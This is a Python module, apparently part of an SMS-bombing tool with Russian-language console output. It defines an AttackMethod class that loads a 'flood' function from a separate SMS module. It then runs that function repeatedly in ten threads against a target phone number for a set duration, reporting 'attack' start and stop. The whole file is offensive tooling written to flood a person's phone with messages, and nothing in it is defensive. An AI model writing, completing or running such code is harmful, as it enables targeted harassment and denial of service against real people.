from time import time, sleep
from threading import Thread
from colorama import Fore
from humanfriendly import format_timespan, Spinner
from tools.crash import CriticalError
from tools.ipTools import GetTargetAddress, InternetConnectionCheck


method = 'SMS'
threads = 10

def GetMethodByName(method):
    if method == "SMS" or method == "sms":
        dir = "tools.SMS.main"
    else:
        raise SystemExit(
            f"{Fore.RED}[!] {Fore.GREEN}К большому сожалению, метода {repr(method)} не существует...{Fore.RESET}"
        )
    module = __import__(dir, fromlist=["object"])
    if hasattr(module, "flood"):
        method = getattr(module, "flood")
        return method
    else:
        CriticalError(
            f"Метод 'flood' не найден {repr(dir)}. Пожалуйста, используйте версию Питона 3.8", "-"
        )





class AttackMethod:

    
    def __init__(self, name, duration, threads, target):
        self.name = name
        self.duration = duration
        self.threads_count = threads
        self.target_name = target
        self.target = target
        self.threads = []
        self.is_running = False

  
    def __enter__(self):
        InternetConnectionCheck()
        self.method = GetMethodByName(self.name)
        self.target = GetTargetAddress(self.target_name, self.name)
        return self

    
    def __exit__(self, exc_type, exc_val, exc_tb):
        print(f"{Fore.RED}[!] {Fore.LIGHTYELLOW_EX}Атака завершена!{Fore.RESET}")

    
    def __RunTimer(self):
        __stopTime = time() + self.duration
        while time() < __stopTime:
            if not self.is_running:
                return
            sleep(1)
        self.is_running = False

   
    def __RunFlood(self):
        while self.is_running:
            self.method(self.target)

    
    def __RunThreads(self):
        
        thread = Thread(target=self.__RunTimer)
        thread.start()
        
        if self.name == "SMS":
            self.threads_count = 10
        
        for _ in range(self.threads_count):
            thread = Thread(target=self.__RunFlood)
            self.threads.append(thread)
        
        with Spinner(
            label=f"{Fore.LIGHTGREEN_EX}[+] {Fore.YELLOW}Запуск {self.threads_count} потоков{Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))
        
        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.RED}[-] {Fore.LIGHTCYAN_EX}Остановка потоков {index + 1}.{Fore.RESET}"
            )

   
    def Start(self):
        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        print(
            f"{Fore.GREEN}[+] {Fore.LIGHTYELLOW_EX}Запускаю атаку на номер {Fore.LIGHTRED_EX}+{target} {Fore.LIGHTYELLOW_EX}метод атаки: {Fore.CYAN}{self.name}{Fore.LIGHTYELLOW_EX}.{Fore.RESET}\n"
            f"{Fore.GREEN}[+] {Fore.LIGHTYELLOW_EX}Атака будет завершена через {Fore.LIGHTBLUE_EX}{duration}{Fore.LIGHTYELLOW_EX}.{Fore.RESET}"
        )
        self.is_running = True
        try:
            self.__RunThreads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n{Fore.RED}[!] {Fore.YELLOW}Ctrl+C выполнено. Остановка {self.threads_count} потоков...{Fore.RESET}"
            )
            
            for thread in self.threads:
                thread.join()
        except Exception as err:
            print(err)
